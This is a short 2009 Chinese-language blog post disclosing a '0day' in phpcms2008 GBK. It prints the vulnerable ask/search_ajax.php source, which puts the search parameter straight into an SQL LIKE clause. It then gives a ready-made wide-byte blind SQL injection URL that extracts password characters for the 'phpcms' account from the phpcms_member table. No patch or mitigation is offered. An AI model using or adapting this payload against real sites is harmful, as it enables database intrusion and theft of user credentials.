---
title: phpcms2008 0day ask/search_ajax.php
description: phpcms20080dayask/search_ajax.php受影响程序：phpcms2008gbk漏洞文件：ask/search_ajax.php......
date: 2009-03-16 09:20:30
category: 漏洞信息
tags: ['PhpCms', '漏洞信息', '0day']
post_id: 815
alias: phpcms2008-0day-ask-search_ajax.php
ViewNums: 3240
---

[phpcms2008 0day ask/search_ajax.php](/blog/phpcms2008-0day-ask-search_ajaxphp)

受影响程序： phpcms2008 gbk

漏洞文件：ask/search_ajax.php

<?php
require './include/common.inc.php';
require_once MOD_ROOT.'include/ask.class.php';
$ask = new ask();
header('Content-type: text/html; charset=utf-8');
if(strtolower(CHARSET) != 'utf-8') $q = iconv(CHARSET, 'utf-8', $q);
if($q)
{
$where = " title LIKE '%$q%' AND status = 5";
}
else
{
exit('null');
}
$infos = $ask->listinfo($where, 'askid DESC', '', 10);

foreach($infos as $key=>$val)
{
$val['title'] = str_replace($q, '<span class="c_orange">'.$q.'</span>', $val['title']);
$info[$key]['title'] = CHARSET != 'utf-8' ? iconv(CHARSET, 'utf-8', $val['title']) : $val['title'];
$info[$key]['url'] = $val['url'];
}

echo(json_encode($info));
?>

测试方法：
ask/search_ajax.php?q=s%E6'/**/or/**/(select ascii(substring(password,1,1))/**/from/**/phpcms_member/**/where/**/username=0x706870636D73)>52%23

via [nuke](http://www.nukeblog.cn/article/125.htm)

